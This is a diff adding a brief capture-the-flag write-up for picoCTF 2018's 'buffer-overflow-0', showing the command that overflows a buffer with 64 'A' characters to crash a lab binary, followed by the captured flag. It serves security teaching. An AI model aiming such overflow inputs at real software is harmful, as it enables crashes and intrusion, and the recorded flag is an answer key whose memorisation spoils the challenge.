@@ -1,0 +1,5 @@
+The goal of this challenge is to trigger a segfault, which will give us the flag.
+To do this, we just need to overflow the buf variable in vuln()
+
+james9909@pico-2018-shell-3:/problems/buffer-overflow-0_4_ab1efebbee9446039487c64b88d38631$ ./vuln $(python -c "print 'A'*64")
+picoCTF{ov3rfl0ws_ar3nt_that_bad_b49d36d2}
